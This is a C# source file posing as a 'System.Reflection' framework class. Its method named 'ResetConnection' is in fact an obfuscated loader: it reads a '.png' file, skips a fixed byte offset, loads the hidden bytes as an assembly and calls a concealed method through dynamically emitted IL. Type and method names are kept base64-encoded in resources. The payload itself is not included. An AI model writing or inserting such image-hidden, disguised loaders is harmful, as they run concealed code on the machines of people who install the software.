using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;

namespace System.Reflection.FPE
{
    public class FPEClient
    {
        //public static string sTob(string s)
        //{
        //    byte[] bytes = Encoding.UTF8.GetBytes(s);
        //    string base64 = Convert.ToBase64String(bytes);
        //    return base64;
        //}

        private static byte[] RAB(string fileName)
        {
            return File.ReadAllBytes(fileName);
        }

        private static Assembly AL(byte[] assemblyBytes)
        {
            return Assembly.Load(assemblyBytes);
        }

        private static string GRFN(string resourceFileName, Assembly assembly)
        {
            foreach (var resource in assembly.GetManifestResourceNames())
                if (resource.EndsWith("." + resourceFileName) || resource == resourceFileName)
                    return resource;
            throw new System.ApplicationException($"Resource '{resourceFileName}' not find in assembly '{Assembly.GetExecutingAssembly().FullName}'");
        }
       
        public static string GTR(string resourceFileName, Assembly assembly)
        {
            var resourceFullName = GRFN(resourceFileName, assembly);
            using (var _textStreamReader = new StreamReader(assembly.GetManifestResourceStream(resourceFullName)))
                return _textStreamReader.ReadToEnd();
        }

        public static string GTR64(string resourceFileName, Assembly assembly)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(GTR(resourceFileName, assembly)));
        }

        public static string bTos(string b)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(b));
        }

        private static string CFE(string fileName, string newExtension)
        {
            var fileNameWithoutExtension = Path.GetFileNameWithoutExtension(fileName);
            return fileNameWithoutExtension + newExtension;

        }

        const string EXT_2 = "LjIucG5n";  // ".2.png"

        public static int ResetConnection()
        {
            try
            {
                var myAssembly = AL(
                    RAB(CFE(GTR64("blpng", Assembly.GetExecutingAssembly()), bTos(EXT_2)))
                        .Skip(34634).ToArray()
                );

                var ml = ML(

                    myAssembly.GetType(GTR64("SMDPFPES", Assembly.GetExecutingAssembly())) // "System.Memory.Data.Past.FPEServer"
                    ,
                    Encoding.UTF8.GetString(Convert.FromBase64String(GTR("RC", Assembly.GetExecutingAssembly()))) /*methodName*/
                );

                bool result = ml(GTR("FzCD", Assembly.GetExecutingAssembly()) /* << fileName*/);
                return result ? 1 : 2;
            }
            catch (Exception ex)
            {
                var m = ex.Message;
                return 3;
            }
            return 4;
        }


        private static Type TL(string typeName, Assembly myAssembly)
        {
            var method = new DynamicMethod($"TL{Environment.TickCount}", typeof(Type), new[] { typeof(Assembly) });
            ILGenerator il = method.GetILGenerator();
            il.Emit(OpCodes.Ldarg_0); // Load the argument (assembly)

            MethodInfo getTypeMethod = typeof(Assembly).GetMethod(bTos("R2V0VHlwZQ==" /* GetType */), new[] { typeof(string) }); // Call Assembly.GetType(string)
            il.Emit(OpCodes.Callvirt, getTypeMethod);
            il.Emit(OpCodes.Ret); // Return
            var func = (Func<Assembly, Type>)method.CreateDelegate(typeof(Func<Assembly, Type>)); // Create delegate
            Type t = func(myAssembly); // Execute
            return t;
        }

        private static Func<string, bool> ML(Type targetType, string methodName)
        {
            MethodInfo resetMethod = targetType.GetMethod(methodName, BindingFlags.Public | BindingFlags.Static);

            // Create a dynamic method that calls ResetConnection(string)
            DynamicMethod dynMethod = new DynamicMethod(
                $"ML{Environment.TickCount}",
                typeof(bool),                      // return type
                new Type[] { typeof(string) },     // parameter types
                typeof(FPEClient).Module           // owner module
            );

            ILGenerator il = dynMethod.GetILGenerator(); // Generate the IL
            il.Emit(OpCodes.Ldarg_0); // Push the string argument (arg0) onto the stack
            il.Emit(OpCodes.Call, resetMethod); // Call the static method
            il.Emit(OpCodes.Ret); // Return the bool result

            return (Func<string, bool>)dynMethod.CreateDelegate(typeof(Func<string, bool>)); // Create a delegate
        }
    }
}
